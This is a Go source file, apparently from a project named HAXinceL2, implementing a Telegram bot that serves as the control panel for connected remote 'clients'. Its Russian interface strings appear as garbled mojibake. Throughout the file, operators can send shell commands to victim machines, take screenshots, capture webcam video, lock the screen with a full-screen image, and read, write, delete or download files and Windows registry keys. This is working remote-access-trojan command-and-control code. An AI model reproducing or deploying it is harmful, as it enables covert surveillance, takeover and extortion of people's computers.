package telegram

import (
	"encoding/json"
	"fmt"
	"log"
	"strconv"
	"strings"
	"time"

	"github.com/E2klime/HAXinceL2/internal"
	"github.com/E2klime/HAXinceL2/internal/protocol"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

type Bot struct {
	api      *tgbotapi.BotAPI
	server   *internal.Server
	adminIDs []int64
}

func NewBot(token string, srv *internal.Server, adminIDs []int64) (*Bot, error) {
	api, err := tgbotapi.NewBotAPI(token)
	if err != nil {
		return nil, fmt.Errorf("failed to create bot: %w", err)
	}

	log.Printf("Authorized on account %s", api.Self.UserName)

	return &Bot{
		api:      api,
		server:   srv,
		adminIDs: adminIDs,
	}, nil
}

func (b *Bot) Start() {
	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60

	updates := b.api.GetUpdatesChan(u)

	for update := range updates {
		if update.Message != nil {
			b.handleMessage(update.Message)
		} else if update.CallbackQuery != nil {
			b.handleCallback(update.CallbackQuery)
		}
	}
}

func (b *Bot) isAdmin(userID int64) bool {
	for _, id := range b.adminIDs {
		if id == userID {
			return true
		}
	}
	return false
}

func (b *Bot) handleMessage(message *tgbotapi.Message) {
	if !b.isAdmin(message.From.ID) {
		msg := tgbotapi.NewMessage(message.Chat.ID, "‚ùå –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É")
		b.api.Send(msg)
		return
	}

	switch message.Command() {
	case "start":
		b.sendWelcome(message.Chat.ID)
	case "clients":
		b.listClients(message.Chat.ID)
	default:
		msg := tgbotapi.NewMessage(message.Chat.ID, "–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /start –¥–ª—è –Ω–∞—á–∞–ª–∞ —Ä–∞–±–æ—Ç—ã")
		b.api.Send(msg)
	}
}

func (b *Bot) handleCallback(callback *tgbotapi.CallbackQuery) {
	if !b.isAdmin(callback.From.ID) {
		return
	}

	parts := strings.Split(callback.Data, ":")
	if len(parts) < 2 {
		return
	}

	action := parts[0]
	clientID := parts[1]

	switch action {
	case "select":
		b.showClientMenu(callback.Message.Chat.ID, clientID)
	case "cmd":
		b.sendCommandPrompt(callback.Message.Chat.ID, clientID)
	case "screenshot":
		b.requestScreenshot(callback.Message.Chat.ID, clientID)
	case "webcam":
		b.requestWebcam(callback.Message.Chat.ID, clientID)
	case "showimg":
		b.sendShowImagePrompt(callback.Message.Chat.ID, clientID)
	case "files":
		b.showFilesMenu(callback.Message.Chat.ID, clientID)
	case "registry":
		b.showRegistryMenu(callback.Message.Chat.ID, clientID)
	case "back":
		b.listClients(callback.Message.Chat.ID)
	}

	b.api.Request(tgbotapi.NewCallback(callback.ID, ""))
}

func (b *Bot) sendWelcome(chatID int64) {
	text := `üëã –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ —Å–∏—Å—Ç–µ–º—É –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞!

–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:
/clients - –°–ø–∏—Å–æ–∫ –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω—ã—Ö –∫–ª–∏–µ–Ω—Ç–æ–≤

–í—ã–±–µ—Ä–∏—Ç–µ –∫–ª–∏–µ–Ω—Ç–∞ –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è.`

	msg := tgbotapi.NewMessage(chatID, text)
	b.api.Send(msg)
}

func (b *Bot) listClients(chatID int64) {
	clients := b.server.GetClients()

	if len(clients) == 0 {
		msg := tgbotapi.NewMessage(chatID, "‚ùå –ù–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω—ã—Ö –∫–ª–∏–µ–Ω—Ç–æ–≤")
		b.api.Send(msg)
		return
	}

	text := "üìã –ü–æ–¥–∫–ª—é—á–µ–Ω–Ω—ã–µ –∫–ª–∏–µ–Ω—Ç—ã:\n\n"
	var keyboard [][]tgbotapi.InlineKeyboardButton

	for _, client := range clients {
		text += fmt.Sprintf("üñ•Ô∏è *%s* (%s@%s)\n", client.ID, client.Username, client.Hostname)
		text += fmt.Sprintf("   OS: %s | Last seen: %s\n\n", client.OS, client.LastSeen.Format("15:04:05"))

		button := tgbotapi.NewInlineKeyboardButtonData(
			fmt.Sprintf("üñ•Ô∏è %s", client.Hostname),
			fmt.Sprintf("select:%s", client.ID),
		)
		keyboard = append(keyboard, []tgbotapi.InlineKeyboardButton{button})
	}

	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"
	msg.ReplyMarkup = tgbotapi.NewInlineKeyboardMarkup(keyboard...)
	b.api.Send(msg)
}

func (b *Bot) showClientMenu(chatID int64, clientID string) {
	client, err := b.server.GetClient(clientID)
	if err != nil {
		msg := tgbotapi.NewMessage(chatID, fmt.Sprintf("‚ùå –ö–ª–∏–µ–Ω—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω: %s", clientID))
		b.api.Send(msg)
		return
	}

	text := fmt.Sprintf(`üñ•Ô∏è *–ö–ª–∏–µ–Ω—Ç: %s*

üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: %s
üíª Hostname: %s
üñ•Ô∏è OS: %s
‚è∞ Last seen: %s

–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:`,
		client.ID,
		client.Username,
		client.Hostname,
		client.OS,
		client.LastSeen.Format("15:04:05"),
	)

	keyboard := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("üíª –ö–æ–º–∞–Ω–¥–∞", fmt.Sprintf("cmd:%s", clientID)),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç", fmt.Sprintf("screenshot:%s", clientID)),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("üìπ –í–µ–±-–∫–∞–º–µ—Ä–∞", fmt.Sprintf("webcam:%s", clientID)),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("üñºÔ∏è –ü–æ–∫–∞–∑–∞—Ç—å –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ", fmt.Sprintf("showimg:%s", clientID)),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("üìÅ –§–∞–π–ª—ã", fmt.Sprintf("files:%s", clientID)),
			tgbotapi.NewInlineKeyboardButtonData("üóÇÔ∏è –†–µ–µ—Å—Ç—Ä", fmt.Sprintf("registry:%s", clientID)),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("‚¨ÖÔ∏è –ù–∞–∑–∞–¥", "back:"),
		),
	)

	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"
	msg.ReplyMarkup = keyboard
	b.api.Send(msg)
}

func (b *Bot) sendCommandPrompt(chatID int64, clientID string) {
	text := fmt.Sprintf("üíª –í–≤–µ–¥–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –Ω–∞ –∫–ª–∏–µ–Ω—Ç–µ *%s*\n\n–ù–∞–ø—Ä–∏–º–µ—Ä: whoami –∏–ª–∏ ipconfig /all\n\n_–ö–æ–º–∞–Ω–¥–∞ –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ —á–µ—Ä–µ–∑ shell._", clientID)

	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"
	b.api.Send(msg)
}

func (b *Bot) requestScreenshot(chatID int64, clientID string) {
	payload := protocol.ScreenshotPayload{
		Quality: 85,
	}

	payloadBytes, _ := json.Marshal(payload)

	msg := &protocol.Message{
		Type:      protocol.TypeScreenshot,
		Payload:   payloadBytes,
		Timestamp: time.Now().Unix(),
	}

	err := b.server.SendCommand(clientID, msg)
	if err != nil {
		reply := tgbotapi.NewMessage(chatID, fmt.Sprintf("‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–º–∞–Ω–¥—ã: %v", err))
		b.api.Send(reply)
		return
	}

	reply := tgbotapi.NewMessage(chatID, "üì∏ –ó–∞–ø—Ä–æ—Å —Å–∫—Ä–∏–Ω—à–æ—Ç–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω. –û–∂–∏–¥–∞–π—Ç–µ...")
	b.api.Send(reply)
}

func (b *Bot) requestWebcam(chatID int64, clientID string) {
	payload := protocol.WebcamPayload{
		Duration: 30,
	}

	payloadBytes, _ := json.Marshal(payload)

	msg := &protocol.Message{
		Type:      protocol.TypeWebcam,
		Payload:   payloadBytes,
		Timestamp: time.Now().Unix(),
	}

	err := b.server.SendCommand(clientID, msg)
	if err != nil {
		reply := tgbotapi.NewMessage(chatID, fmt.Sprintf("‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–º–∞–Ω–¥—ã: %v", err))
		b.api.Send(reply)
		return
	}

	reply := tgbotapi.NewMessage(chatID, "üìπ –ó–∞–ø—Ä–æ—Å –≤–µ–±-–∫–∞–º–µ—Ä—ã –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –≤–µ–±-–∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å...")
	b.api.Send(reply)
}

func (b *Bot) sendShowImagePrompt(chatID int64, clientID string) {
	text := fmt.Sprintf("üñºÔ∏è –í–≤–µ–¥–∏—Ç–µ URL –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è –¥–ª—è –ø–æ–∫–∞–∑–∞ –Ω–∞ –∫–ª–∏–µ–Ω—Ç–µ *%s*\n\n–ù–∞–ø—Ä–∏–º–µ—Ä: https://example.com/warning.png\n\n_–ò–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –±—É–¥–µ—Ç –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∞ –≤–µ—Å—å —ç–∫—Ä–∞–Ω —Å –±–ª–æ–∫–∏—Ä–æ–≤–∫–æ–π._", clientID)

	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"
	b.api.Send(msg)
}

func (b *Bot) ExecuteCommand(clientID, command string, args []string) error {
	payload := protocol.CommandPayload{
		Command: command,
		Args:    args,
	}

	payloadBytes, _ := json.Marshal(payload)

	msg := &protocol.Message{
		Type:      protocol.TypeCommand,
		Payload:   payloadBytes,
		Timestamp: time.Now().Unix(),
	}

	return b.server.SendCommand(clientID, msg)
}

func (b *Bot) ShowImage(clientID, imageURL string, duration int) error {
	payload := protocol.ShowImagePayload{
		ImageURL: imageURL,
		Duration: duration,
	}

	payloadBytes, _ := json.Marshal(payload)

	msg := &protocol.Message{
		Type:      protocol.TypeShowImage,
		Payload:   payloadBytes,
		Timestamp: time.Now().Unix(),
	}

	return b.server.SendCommand(clientID, msg)
}

func ParseAdminIDs(idsStr string) ([]int64, error) {
	parts := strings.Split(idsStr, ",")
	ids := make([]int64, 0, len(parts))

	for _, part := range parts {
		part = strings.TrimSpace(part)
		if part == "" {
			continue
		}

		id, err := strconv.ParseInt(part, 10, 64)
		if err != nil {
			return nil, fmt.Errorf("invalid admin ID: %s", part)
		}
		ids = append(ids, id)
	}

	return ids, nil
}

func (b *Bot) showFilesMenu(chatID int64, clientID string) {
	text := fmt.Sprintf(`üìÅ *–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–∞–º–∏: %s*

–î–æ—Å—Ç—É–ø–Ω—ã–µ –æ–ø–µ—Ä–∞—Ü–∏–∏:
- –ß—Ç–µ–Ω–∏–µ —Ñ–∞–π–ª–∞
- –ó–∞–ø–∏—Å—å —Ñ–∞–π–ª–∞
- –£–¥–∞–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–∞
- –°–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤ –≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
- –°–∫–∞—á–∏–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞

–í–≤–µ–¥–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É –≤ —Ñ–æ—Ä–º–∞—Ç–µ:
/file_read <path>
/file_write <path> <base64_content>
/file_delete <path>
/file_list <path>
/file_download <path>`, clientID)

	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"

	keyboard := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("‚¨ÖÔ∏è –ù–∞–∑–∞–¥", fmt.Sprintf("select:%s", clientID)),
		),
	)
	msg.ReplyMarkup = keyboard

	b.api.Send(msg)
}

func (b *Bot) showRegistryMenu(chatID int64, clientID string) {
	text := fmt.Sprintf(`üóÇÔ∏è *–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Ä–µ–µ—Å—Ç—Ä–æ–º Windows: %s*

–î–æ—Å—Ç—É–ø–Ω—ã–µ –æ–ø–µ—Ä–∞—Ü–∏–∏:
- –ß—Ç–µ–Ω–∏–µ –∑–Ω–∞—á–µ–Ω–∏—è —Ä–µ–µ—Å—Ç—Ä–∞
- –ó–∞–ø–∏—Å—å –∑–Ω–∞—á–µ–Ω–∏—è –≤ —Ä–µ–µ—Å—Ç—Ä
- –£–¥–∞–ª–µ–Ω–∏–µ –∫–ª—é—á–∞/–∑–Ω–∞—á–µ–Ω–∏—è
- –°–ø–∏—Å–æ–∫ –ø–æ–¥–∫–ª—é—á–µ–π/–∑–Ω–∞—á–µ–Ω–∏–π

–í–≤–µ–¥–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É –≤ —Ñ–æ—Ä–º–∞—Ç–µ:
/reg_read <key> <value>
/reg_write <key> <value> <data> <type>
/reg_delete <key> [value]
/reg_list <key>

–ü—Ä–∏–º–µ—Ä:
/reg_read HKLM\Software\Microsoft Version
/reg_write HKCU\Software\Test MyValue 123 dword`, clientID)

	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"

	keyboard := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("‚¨ÖÔ∏è –ù–∞–∑–∞–¥", fmt.Sprintf("select:%s", clientID)),
		),
	)
	msg.ReplyMarkup = keyboard

	b.api.Send(msg)
}
